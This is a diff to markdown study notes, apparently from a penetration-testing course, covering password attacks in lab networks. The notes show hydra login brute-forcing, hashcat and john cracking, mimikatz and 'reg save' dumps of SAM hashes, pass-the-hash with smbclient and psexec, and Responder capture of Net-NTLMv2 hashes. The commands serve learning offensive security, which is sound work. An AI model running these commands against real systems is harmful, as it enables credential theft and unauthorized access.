@@ -28,9 +28,8 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" ftp://
 
 ```bash
 # http-post-form
-#
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.180.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
-
+# http-basic-auth
 hydra -l admin -V -P /usr/share/wordlists/rockyou.txt "http-get://10.9.9.12:8080/manager/html:A=BASIC:F=401"
 
 ```
@@ -39,11 +38,9 @@ hydra -l admin -V -P /usr/share/wordlists/rockyou.txt "http-get://10.9.9.12:8080
 
 * Set hash type
 * -m 0 e.g. hash type MD5
-* Benchmark which tool perform better
 * -b benchmark
 * Follow known password policy rules `/usr/share/hashcat/rules`
 * More `https://hashcat.net/wiki/doku.php?id=rule_based_attack#implemented_compatible_functions`
-
 
 ```bash
 hashcat -b
@@ -55,7 +52,7 @@ Manipulate dictionary files with rule sets
 
 ```bash
 # delete lines no starting with 1
-sed -i '/^1/d' /tmp/pass.txt
+sed -i '/^1/d' pass.txt
 # capitalize with c
 echo c > demo.rule
 # prepend with ^
@@ -71,6 +68,7 @@ hashcat -r demo.rule --stdout pass.txt
 ```
 
 ```bash
+# crack an MD5 hash -m 0
 ls /usr/share/hashcat/rules
 hashcat -m 0 crackme.txt -r demo.rule --force /usr/share/wordlists/rockyou.txt
 hashcat -m 0 "8743b52063cd84097a65d1633f5c74f5" -r demo.rule /usr/share/wordlists/rockyou.txt
@@ -109,8 +107,10 @@ hashcat -m 13400 keepass.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/
 
 ```bash
 ssh2john id_rsa > ssh.john
+# remove filename: id_rsa
+cat ssh.john | cut -d: -f2 > ssh.hash
 
-# hashcat does NOT support the hash
+# hashcat does NOT support the hash aes-256-ctr
 hashcat --help | grep -i "ssh"
 
 # prepare john.conf
@@ -120,33 +120,41 @@ c $1 $3 $7 $!
 c $1 $3 $7 $#
 sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
 # run john
-john --wordlist=ssh.passwords --rules=sshRules ssh.john
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 # connect ssh
 chmod 600 id_rsa
-ssh -i id_rsa -p user@192.168.180.201
+ssh -i id_rsa -p 22 ser@192.168.180.201
 ```
 
 ## NTLM Cracking
 
 * **Limitation**: Require privileges `SeDebugPrivilege` or `Administrator`
-* **Limitation**: Require privileges `SeImpersonatePrivilege13` for token elevation
+* **Limitation**: Require privileges `SeImpersonatePrivilege` for token elevation
 * Use mimikatz to extract with NTLM hashes
 * Module `sekurlsa` extracts the password hash from LSASS 
 * SAM Folder `C:\Windows\system32\config\sam`
 
 ```powershell
 # enumerate local users
+net user
 Get-LocalUser
 
 Mimikatz.exe
-# Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
+# Enabling SeDebugPrivilege, elevating to SYSTEM user 
 privilege::debug
   20 'OK'
+# Extracting NTLM hashes, requires SeImpersonatePrivilege
 token::elevate
   -> Impersonated !
 lsadump::sam
   NTML hash:
 # sekurlsa::logonpasswords
+```
+
+```powershell
+# Extracting NTLM hashes, requires SeImpersonatePrivilege
+reg save HKLM\sam sam
+reg save HKLM\system system
 ```
 
 ```bash
@@ -156,15 +164,14 @@ hashcat --help | grep -i "ntlm"
 hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  
 ```
 
-## Passing NTLM
+## Passing NTLM Hash
 
 * pass-the-hash (PtH) technique
- ** run pwsh as admin
- ** get hash with mimikatz
+  * run pwsh as admin
+  * get hash with mimikatz
 * authenticate with administrator to a local or remote target with **username and NTLM hash**
 * SMB tools `smbclient` or `CrackMapExec`
 * RCE tools `impacket-psexec` or `impacket-wmiexec`
-
 
 ```powershell
 # run pwsh as admin
@@ -174,15 +181,15 @@ User : Administrator
   Hash NTLM: 7a38310ea6f0027ee955abed1762964b
 ```
 
-Use SMB tool smbclient with pass-the-hash
+## Use SMB tool smbclient with pass-the-hash
 
 ```bash
+# escape backslashes
 smbclient \\\\192.168.1.2\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
-
 smb >
 ```
 
-Use RCE tool impacket-psexec with pass-the-hash
+## Use RCE tool impacket-psexec with pass-the-hash
 
 psexec searches for a writable share e.g. SMB and uploads an executable file to it. Then it registers the executable as a Windows service and starts it. The result often is the desired remote code execution.
 
@@ -204,7 +211,7 @@ C:\>whoami
 files02\administrator
 ```
 
-## Cracking Net-NTLMv2
+## Abuse Net-NTLMv2 Auth Protocol
 
 * Abuse the Net-NTLMv2 network authentication protocol
 * Use `Responder` tool to setup a honeypot and print captured hashes
@@ -223,14 +230,15 @@ tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UN
     link/none 
     inet 192.168.45.171
 
-sudo responder -I tun0
+# -I interface
+sudo responder -I tun0 -v
 ...
 SMB server                 [ON]
 [+] Listening for events...
 
 [SMB] NTLMv2-SSP Client   : 192.168.167.211
-[SMB] NTLMv2-SSP Username : FILES01\paul
-[SMB] NTLMv2-SSP Hash     : paul::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:0101000000000000006471165D1BDB0152F3CB46EB1EC1D20000000002000800590034003500440001001E00570049004E002D0052004500450043004C004E004400500041004C00340004003400570049004E002D0052004500450043004C004E004400500041004C0034002E0059003400350044002E004C004F00430041004C000300140059003400350044002E004C004F00430041004C000500140059003400350044002E004C004F00430041004C0007000800006471165D1BDB0106000400020000000800300030000000000000000000000000200000104E03C87D48BBB6D80BF2579BC979DA56B1D0BDBF6575FD55E2565FF6CACFD00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370031000000000000000000
+[SMB] NTLMv2-SSP Username : FILES01\someone
+[SMB] NTLMv2-SSP Hash     : someone::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:TRUNCATED
 ```
 
 ```powershell
@@ -239,14 +247,14 @@ C:\Windows\system32>dir \\192.168.45.171\test
 ```
 
 ```bash
-cat << EOF > paul.hash      
-paul::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:0101000000000000006471165D1BDB0152F3CB46EB1EC1D20000000002000800590034003500440001001E00570049004E002D0052004500450043004C004E004400500041004C00340004003400570049004E002D0052004500450043004C004E004400500041004C0034002E0059003400350044002E004C004F00430041004C000300140059003400350044002E004C004F00430041004C000500140059003400350044002E004C004F00430041004C0007000800006471165D1BDB0106000400020000000800300030000000000000000000000000200000104E03C87D48BBB6D80BF2579BC979DA56B1D0BDBF6575FD55E2565FF6CACFD00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370031000000000000000000
+cat << EOF > someone.hash      
+someone::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:0101000000000000006471165D1BDB0152F3CB46EB1EC1D20000000002000800590034003500440001001E00570049004E002D0052004500450043004C004E004400500041004C00340004003400570049004E002D0052004500450043004C004E004400500041004C0034002E0059003400350044002E004C004F00430041004C000300140059003400350044002E004C004F00430041004C000500140059003400350044002E004C004F00430041004C0007000800006471165D1BDB0106000400020000000800300030000000000000000000000000200000104E03C87D48BBB6D80BF2579BC979DA56B1D0BDBF6575FD55E2565FF6CACFD00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370031000000000000000000
 EOF
 
 hashcat --help | grep -i "ntlmv2"
    5600 | NetNTLMv2
 
-hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 5600 someone.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
 ## Abusing Net-NTLMv2 using Web file upload or XXS vuln
